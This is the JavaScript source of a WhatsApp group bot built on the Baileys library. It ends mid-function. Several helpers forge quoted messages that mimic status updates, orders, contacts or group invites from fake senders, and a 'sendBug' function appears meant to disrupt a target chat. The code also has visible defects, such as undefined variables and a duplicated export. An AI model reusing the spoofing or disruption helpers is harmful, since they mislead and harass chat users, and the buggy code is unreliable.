/* 
Don't change credits🥲🚶
Sourcecode https://github.com/TEDZO123/TEDZO-SIR-V2

Want to recode? yes, it's up to you as long as you don't change the watermark
Don't sell the SC 😐👌
*/
const {
    WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
	mentionedJid,
	processTime,
	Browsers,
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const speed = require('performance-now')
const { spawn, exec, execSync } = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require("twitter-url-direct")
const brainly = require('brainly-scraper')
const translate = require("@vitalets/google-translate-api");
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const Math_js = require('mathjs')
const _gis = require('g-i-s')
const fetch = require('node-fetch');
const request = require('request');
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const crypto = require('crypto')
const { promisify, util } = require('util')
const qrcodes = require('qrcode');
const googleIt = require('google-it')
const os = require('os');
const hx = require('hxz-api')

const { Menu, rulesBot } = require('./message/help.js')
const { getBuffer, getGroupAdmins, generateMessageID, getRandom, runtime, pickRandom, sleep } = require('./lib/myfunc')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetch')
const { color, bgcolor } = require('./lib/color')
const { mess } = require('./message/mess')
const { Toxic } = require('./lib/Toxic.js')
const { cmdadd } = require('./lib/totalcmd.js')
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage')
const { lirikLagu} = require('./lib/lirik.js')
const { mediafireDl } = require('./lib/mediafire.js')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { webp2mp4File } = require('./lib/webp2mp4')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const truth = JSON.parse(fs.readFileSync('./database/truth.json'))
const dare = JSON.parse(fs.readFileSync('./database/dare.json'))
const atm = require("./lib/atm");
const level = require("./lib/level");
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { isAfk, cekafk, addafk } = require('./lib/offline')
const a = '▢'

hit_today = []
banChats = true
offline = false

let fakeimage = fs.readFileSync("./tedzo.jpg")
let setting = JSON.parse(fs.readFileSync('./setting.json'))


prefix = setting.prefix
owner = setting.owner
lolkey = setting.lolkey
ownerName = setting.ownerName
fake = setting.fake
autorespon = false
waktu = '-'
alasan = '-'

const Exif = require('./lib/exif')
const exif = new Exif()

// Database
let register = JSON.parse(fs.readFileSync('./database/register.json'))
let _scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
let config 
let _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/level.json'))
let _uang = JSON.parse(fs.readFileSync('./database/uang.json'))
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const setik = JSON.parse(fs.readFileSync('./database/setik.json'))
const  vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const  imagi = JSON.parse(fs.readFileSync('./database/imagi.json'))
const  videonye = JSON.parse(fs.readFileSync('./database/video.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))

// Sticker Cmd
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}
module.exports = m = async (m) => {
	try {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe && m.key.fromMe) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jamu = moment.tz('Asia/Kolkata').format('HH:mm:ss')
let d = new Date
let locale = 'id'
const gmtu = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
const wetonj = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const weeku = d.toLocaleDateString(locale, { weekday: 'long' })
const calenderh = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
let keynye = m.key
let c = bosco.chats.get(keynye.remoteJid)
let a = c.messages.dict[`${keynye.id}|${keynye.fromMe ? 1: 0}`]
let contennye = bosco.generateForwardMessageContent(a, false)
} catch {
}
}


module.exports = bosco = async (bosco, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
		global.prefix
		mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment().tz('Asia/Kolkata').format('HH:mm:ss')
		const wib = moment.tz('Asia/Kolkata').format('HH:mm:ss')
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]        
		const antibot = m.isBaileys
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		hit_today.push(command)
		const arg = body.substring(body.indexOf(' ') + 1)
		const ar = args.map((v) => v.toLowerCase())
		const argz = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix) 
		if (isCmd) cmdadd()
		const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
        const q = args.join(' ')
        const c = args.join(' ')

        const botNumber = bosco.user.jid
        const ownerNumber = setting.ownerNumber
		const ownerName = setting.ownerName
		const botName = setting.botName
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? bosco.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const totalchat = await bosco.chats.all()
		isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
	    const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
		const groupMetadata = isGroup ? await bosco.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const conts = mek.key.fromMe ? bosco.user.jid : bosco.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? bosco.user.name : conts.notify || conts.vname || conts.name || '-'
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		const dfrply = fs.readFileSync('./ds.jpg')
		const atibot = m.isBaileys
		const isRegister = register.includes(sender)
        const isOwner = ownerNumber.includes(sender)
        const isKickArea = isGroup ? kickarea.includes(from) : false
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const isLevelingOn = isGroup ? _leveling.includes(from) : false
        const isMuted = isGroup ? mute.includes(from) : false
        const isAuto = isGroup ? autosticker.includes(from) : false



        // here button function
        selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''

        responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
        
        if (antibot === true) return
		const catl = (teks) => {
             res = bosco.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 400, "message": teks, "footerText": "*𝚃𝚎𝚍𝚣𝚘 Ser*", "thumbnail": dfrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             bosco.relayWAMessage(res)
        }
       const catlo = (teks) => {
             res = bosco.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 70000, "message": teks, "footerText": "Made With 𝙰𝚜𝚕𝚞 𝚜𝚒𝚛", thumbnail: fs.readFileSync('./ds.jpg'), "surface": 'CATALOG' }}, {quoted:mek})
             bosco.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = bosco.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/JqUKjz9djTS9mDmxA2ph2t', "groupName": `TEDZO BOTS`, "footerText": "*tedzo Ser*", "jpegThumbnail": dfrply, "caption": teks}}, {quoted:fvideo})
            bosco.relayWAMessage(grup)
        }
        try {
		pporang = await bosco.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const denis = await getBuffer(pporang)

        const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        function monospace(string) {
            return '```' + string + '```'
        }   
        function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }
        const reply = (teks) => {
	      bosco.sendMessage(from, teks, text, { thumbnail: denis, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: false, "externalAdReply": { "title": `${' '}FOLLOW MY IG : Tedzo SIR${''}${''}`, "body": `TEDZO SIR BOT`, "previewType": 'PHOTO', "thumbnailUrl": `${''}`, "thumbnail": denis, "sourceUrl": `${''}`}},})
        }
        const sendMess = (hehe, teks) => {
           bosco.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
           (id == null || id == undefined || id == false) ? bosco.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/wpmobile.jpg')}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : bosco.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/wpmobile.jpg')}, extendedText, { sendEphemeral: true, quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        const sendText = (from, text) => {
           bosco.sendMessage(from, text, MessageType.text)
        }
        const textImg = (teks) => {
           return bosco.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync('./media/wpmobile.jpg')})
        }
        
        const fakestatus = (teks) => {
            return bosco.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./ds.jpg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            return bosco.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./tedzo.jpg'),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            return bosco.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./ds.jpg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
      const fgclink = (teks) => {
            bosco.sendMessage(from, teks, text, {
                quoted: {
	                key: {
		               fromMe: true,
		                participant: "0@s.whatsapp.net",
		                  remoteJid: "0@s.whatsapp.net"
	               },
	              message: {
		               "groupInviteMessage": {
			               "groupJid": "6288213840883-1616169743@g.us",
			               "inviteCode": "mememteeeekkeke",
			               "groupName": ".bot", 
                           "caption": `𝑪𝑴𝑫 𝑬𝑿𝑪𝑳𝑼𝑫𝑬𝑫 : \n 🤖 \n 𝑴𝑨𝑫𝑬 𝑩𝒀 𝑻𝑬𝑫𝒁𝑶 𝑺𝑰𝑹`, 
                           'jpegThumbnail': fs.readFileSync(`ds.jpg`)
		                }
	               }
             }
       })
    }
    // TEXT WITH THUMBNAIL
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `hello bro ${pushname}`,
                 "title": `${pushname}`,
                 'jpegThumbnail': dfrply
                        }
	                  } 
                     }
       const fakeitem = (teks) => {
           return bosco.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"status@broadcast" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`ds.jpg`),"itemCount":2021,"status":"INQUIRY","surface":"CATALOG","message":`${fake}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
                    //WAKTU
			var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Midnight"; break;
                case 1: jamss = "Midnight"; break;
                case 2: jamss = "Midnight"; break;
                case 3: jamss = "Midnight"; break;
                case 4: jamss = "Midnight"; break;
                case 5: jamss = "Dawn"; break;
                case 6: jamss = "Morning"; break;
                case 7: jamss = "Morning"; break;
                case 8: jamss = "Morning"; break;
                case 9: jamss = "Morning"; break;
                case 10: jamss = "Morning"; break;
                case 11: jamss = "Afternoon"; break;
                case 12: jamss = "Zuhur"; break;
                case 13: jamss = "Afternoon"; break;
                case 14: jamss = "Afternoon"; break;
                case 15: jamss = "Asr"; break;
                case 16: jamss = "Afternoon"; break;
                case 17: jamss = "Evening"; break;
                case 18: jamss = "Maghrib"; break;
                case 19: jamss = "Isha"; break;
                case 20: jamss = "Night"; break;
                case 21: jamss = "Night"; break;
                case 22: jamss = "Midnight"; break;
                case 23: jamss = "Midnight"; break;
            }
            var tampilUcapan = "" + jamss;
            const jmo = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
            const jmn = moment.tz('Asia/Kolkata').format('hh:mm')
				let d = new Date
				let locale = 'en'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
		///Button Location
/*const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await bosco.prepareMessage(from, kma, location)
/*const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
/}
bosco.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
/}*/
//Button ocument
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await bosco.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
bosco.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

// VIDEO
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `tedzo sir`,
                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  }

        //FAKEREPLY PRODUCT
            const ftoko = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./ds.jpg`)},"title": `▢ ${fake} ▢`,"description": "hehe", "currencyCode": "IDR","priceAmount1000": "000000000000000","retailerId": "X - Dev Team","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
            //FAKE KONTAK
            const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${fake}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Its Me tedzo Ser\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./ds.jpg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": true}}}
            //FAKE VN
            const fvn = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "359996400","ptt": "true"}}}
            //FAKE TEXT
            const ftext = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `▢ ${fake} ▢`,"title": `Hmm`,'jpegThumbnail': denis}}}
            //FAKE LIVE ACTION
            const floc2 = {
                  key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
            //FAKEREPLY TROLI
            const ftroli = {
                  key: {participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: { "orderMessage": { "itemCount" : '2021', "status": '1', "surface": '1', "message": `▢ ${fake} ▢`, "orderTitle": 'Bang', "thumbnail": denis, "sellerJid": '0@s.whatsapp.net'}}}
            //FAKEREPLY VIDEO
            const fvideo = {
                  key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}) },message: { "videoMessage": { "title":"fake","h": `Hmm`,'seconds': '359996400', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./life.jpg')}}}
            //FAKEREPLY GROUPINVITE
            const fgc = {
                  key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./ds.jpg')}}}
            //FAKEREPLY GIF
            const fgif = {
                  key: {fromMe: false,participant: `@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `▢ ${fake} ▢`,'jpegThumbnail': fs.readFileSync('./ds.jpg')}}} 
            
            // TROLI

        const replyWithFakeig = (teks) => {
bosco.sendMessage(from, teks, text,{contextInfo:{
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": 'Whatsapp Bot 🤘By ɪ̄.ᴀᴍ/ꪶ͢tedzo_sᴇʀꫂ' ,
"body": `${jmn} -  ${jmo}\n${week} - ${calender}`,
"mediaType": "2",
"thumbnail": dfrply,
"mediaUrl": "https://youtu.be/Y6jWCKUv_Kg",
"thumbnail": dfrply,
"sourceUrl": "https://github.com/"
},mentionedJid:[sender]}, quoted : fakestatus})
}
       const math = (teks) => {
           return Math.floor(teks)
       }
       const kick = function(from, orangnya){
	       for (let i of orangnya){
	       bosco.groupRemove(from, [i])
        }
        }
       const kickMember = async(id, target = []) => {
           let group = await bosco.groupMetadata(id)
           let owner = group.owner.replace("c.us", "s.whatsapp.net")
           let me = bosco.user.jid
           for (i of target) {
           if (!i.includes(me) && !i.includes(owner)) {
           await bosco.groupRemove(from, [i])
        } else {
           await bosco.sendMessage(id, "Not Premited!", "conversation")
        }
    }
}
// AUTO
			for (let anji of setik){
				if (budy === anji){
					result = fs.readFileSync(`./media/sticker/${anji}.webp`)
					bosco.sendMessage(from, result, sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from } : {})}, message: { orderMessage: { itemCount: 2021, status: 200, thumbnail: fs.readFileSync('./ds.jpg'), surface: 200, message: `${pushname}`, orderTitle: `${pushname}`, sellerJid: '0@s.whatsapp.net'}}}})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					bosco.sendMessage(from, result, audio, { quoted: mek, mimetype: 'audio/mp4', duration: 1, ptt: true, contextInfo: { forwardingScore: 0, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					bosco.sendMessage(from, result, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync('./ds.jpg'), surface: 200, message: `${fake}`, orderTitle: `MADE BY ASLU`, sellerJid: '0@s.whatsapp.net'}}}})
					}
			}
			for (let anje of videonye){
				if (budy === anje){
					result = fs.readFileSync(`./media/video/${anje}.mp4`)
					bosco.sendMessage(from, result, video, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}, mimetype: 'video/mp4' })
					}
			}
       const add = function(from, orangnya){
	       bosco.groupAdd(from, orangnya)
}
      const sendBug = async(target, teks) => {
           if (!teks) teks = '.'
           await bosco.relayWAMessage(bosco.
           prepareMessageFromContent(target, bosco.
           prepareDisappearingMessageSettingContent(0),
           {}),{waitForAck:true})
           bosco.sendMessage(target, teks, 'conversation')
}
       const sendKontak = (from, nomor, nama, org = "") => {
	       const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	       bosco.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: mek})
}
      const hideTag = async function(from, text){
	       let anu = await bosco.groupMetadata(from)
	       let members = anu.participants
	       let ane = []
	       for (let i of members){
	       ane.push(i.jid)
}
	       bosco.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/Nakano.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}  
      const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, './sticker' + names + '.png', async function () {
           console.log('finished');
           let filess = './sticker' + names + '.png'
           let asw = './sticker' + names + '.webp'
           exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
           fs.unlinkSync(filess)
           if (err) return reply(`${err}`)
           exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
           if (error) return reply(`${error}`)
           bosco.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:mek})
           fs.unlinkSync(asw)
});
});
});
}
       const sendMediaURL = async(to, url, text="", mids=[]) =>{
           if(mids.length > 0){
           text = normalizeMention(to, text, mids)
}
           const fn = Date.now() / 10000;
           const filename = fn.toString()
           let mime = ""
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           mime = res.headers['content-type']
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, filename, async function () {
           console.log('done');
           let media = fs.readFileSync(filename)
           let type = mime.split("/")[0]+"Message"
           if(mime === "image/gif"){
           type = MessageType.video
           mime = Mimetype.gif
}
           if(mime.split("/")[0] === "audio"){
           mime = Mimetype.mp4Audio
